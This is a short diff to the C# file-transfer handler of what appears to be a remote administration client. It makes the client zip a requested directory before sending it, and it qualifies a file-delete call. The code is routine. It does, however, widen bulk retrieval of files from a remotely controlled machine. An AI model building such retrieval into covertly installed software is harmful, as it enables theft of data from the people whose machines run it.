@@ -1,4 +1,5 @@
 ﻿using Rouzzf.Client.Networking;
+using Rouzzf.Client.Utilities;
 using Rouzzf.Common;
 using Rouzzf.Common.Enums;
 using Rouzzf.Common.Extensions;
@@ -226,6 +227,11 @@ namespace Rouzzf.Client.Messages
                 _limitThreads.WaitOne();
                 try
                 {
+                    if(message.FileType == FileType.Directory)
+                    {
+                        FileCompression.CompressDirectory(message.RemotePath, message.RemotePath + ".zip", 9, false);
+                        message.RemotePath = message.RemotePath + ".zip";
+                    }
                     using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                     {
                         _activeTransfers[message.Id] = srcFile;
@@ -298,7 +304,7 @@ namespace Rouzzf.Client.Messages
                     if (File.Exists(filePath))
                     {
                         // delete existing file
-                        NativeMethods.DeleteFile(filePath);
+                        Common.NativeMethods.DeleteFile(filePath);
                     }
 
                     _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
